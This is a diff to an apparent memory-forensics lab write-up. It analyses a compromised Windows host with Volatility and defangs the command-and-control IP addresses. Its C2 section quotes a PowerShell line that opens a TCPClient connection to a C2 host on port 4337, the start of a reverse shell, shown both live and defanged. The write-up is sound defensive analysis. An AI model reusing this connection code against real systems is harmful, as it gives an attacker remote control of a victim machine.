@@ -24,12 +24,12 @@ Identify malicious network connections associated with the compromised host and 
 
 **Filtered for C2 IP**:
 
-`python vol.py -f memory.dmp --profile=Win10x64_17763 netscan | Select-String "10.0.128.2"`
+`python vol.py -f memory.dmp --profile=Win10x64_17763 netscan | Select-String "10[.]0[.]128[.]2"`
 
 **Result**
 | Local Address | Remote Address | State |
 | :--- | :--- | :--- |
-| 10.0.128.0:63944 | 10.0.128.2:4337 | ESTABLISHED |
+| 10[.]0[.]128[.]0:63944 | 10[.]0[.]128[.]2:4337 | ESTABLISHED |
 
 ## 4. Source Port Identification
 - Local source port: 63944
@@ -43,7 +43,7 @@ The compromised system initiated an outbound TCP connection from ephemeral port 
 ## 5. C2 Script Behavior
 **Extracted from strings_out.txt**:
 
-`$client = New-Object System.Net.Sockets.TCPClient('10.0.128.2',4337);`
+`$client = New-Object System.Net.Sockets.TCPClient('10[.]0[.]128[.]2',4337);`
 
 **Defanged**:
 
